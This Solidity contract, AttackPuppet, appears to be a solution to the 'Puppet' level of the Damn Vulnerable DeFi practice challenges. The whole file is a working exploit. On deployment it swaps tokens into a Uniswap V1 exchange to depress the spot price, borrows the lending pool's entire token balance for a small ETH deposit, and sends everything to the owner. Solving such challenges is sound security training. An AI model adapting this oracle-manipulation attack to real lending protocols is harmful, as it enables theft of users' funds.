pragma solidity ^0.8.0;


import "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/utils/Address.sol";



interface UniswapV1Exchange {
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
        external
        payable
        returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
}


contract AttackPuppet {
    using Address for address payable;
    address payable _owner;
    PuppetPool _pool;
    DamnValuableToken _token;
    UniswapV1Exchange _exchange;


    constructor(address owner, address exchange, address token, address pool) payable {
        _owner = payable(owner);
        _exchange = UniswapV1Exchange(exchange);
        _pool = PuppetPool(pool);
        _token = DamnValuableToken(token);

        

        attack();
    }


    function attack() public payable {
        _token.approve(address(_exchange), _token.balanceOf(address(this))); 

        _exchange.tokenToEthSwapInput(_token.balanceOf(address(this)), 1 ether, uint256(block.timestamp + 100));

        uint256 amount = _pool.calculateDepositRequired(_token.balanceOf(address(this)));

        _pool.borrow{value: amount, gas: 1e6}(_token.balanceOf(address(_pool)), _owner);

        
        _owner.transfer(address(this).balance);
        _token.transfer(address(_owner), _token.balanceOf(address(this)));
    }


    receive() external payable {}
}